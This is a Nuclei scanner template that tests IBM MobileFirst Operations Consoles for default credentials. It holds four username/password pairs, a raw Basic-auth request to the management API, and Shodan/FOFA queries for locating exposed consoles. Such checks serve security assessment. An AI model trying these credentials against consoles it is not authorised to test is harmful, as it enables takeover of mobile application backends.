http:
- attack: pitchfork
  extractors:
  - group: 1
    part: body
    regex:
    - '"productVersion"\s*:\s*"([^"]+)"'
    type: regex
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - productVersion
    - synchronizationStatus
    - management-apis
  - part: header
    type: word
    words:
    - application/json
  matchers-condition: and
  payloads:
    password:
    - admin
    - demo
    - admin
    - passw0rd
    username:
    - admin
    - demo
    - appcenteradmin
    - root
  raw:
  - 'GET /mfpadmin/management-apis/2.0/runtimes HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + '':'' + password)}}

    Accept: application/json

    '
  stop-at-first-match: true
id: ibm-mfp-default-login
info:
  author: Vishal Vishwakarma
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-798
  description: 'Detected IBM MobileFirst Foundation Operations Console was found using
    default credentials. The administration REST API exposes full control over mobile
    application backends including adapter management, push notification infrastructure,
    OAuth security configuration, and application authenticity enforcement.

    '
  metadata:
    fofa-query: title="MobileFirst Operations Console"
    max-request: 4
    product: mobilefirst-foundation
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)MobileFirst Operations
      Console"})
    shodan-query: http.title:"MobileFirst Operations Console"
    vendor: ibm
    verified: true
  name: IBM MobileFirst Foundation - Default Credentials
  reference:
  - https://www.ibm.com/docs/en/mfp/8.0?topic=console-mobilefirst-operations
  - https://mobilefirstplatform.ibmcloud.com/tutorials/en/foundation/8.0/installation-configuration/production/server-configuration/
  severity: critical
  tags: default-login,ibm,mobilefirst
